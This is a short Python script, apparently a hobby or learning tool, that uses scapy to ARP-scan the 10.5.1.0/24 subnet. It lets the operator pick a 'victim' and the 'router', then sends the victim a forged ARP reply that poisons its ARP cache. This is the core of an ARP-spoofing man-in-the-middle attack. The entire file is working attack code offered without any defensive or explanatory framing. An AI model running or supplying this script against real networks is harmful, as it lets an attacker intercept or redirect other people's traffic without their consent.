from scapy.all import ARP, Ether, srp


result = srp((Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.5.1.0/24")), timeout=3, verbose=0)[0]

print("Online IPs:")
ip=[]
mac=[]
for sent, received in result:
    ip.append(received.psrc)
    mac.append(received.hwsrc)

for i in range (len(ip)):
    print(ip[i], " = ", mac[i])

print("Chose a victim:")
victim = int(input())
print("Chose the router:")
router = int(input())

print ("Victim ip: ", ip[victim-1],"    Victim mac: ", mac[victim-1])

print ("Router ip: ", ip[router-1],"    Router mac: ", mac[router-1])

arply = srp(ARP(hwdst =(mac[victim-1]),op = 2,pdst=(ip[victim-1]), psrc=(ip[router-1])), timeout=3, verbose=0)

    
    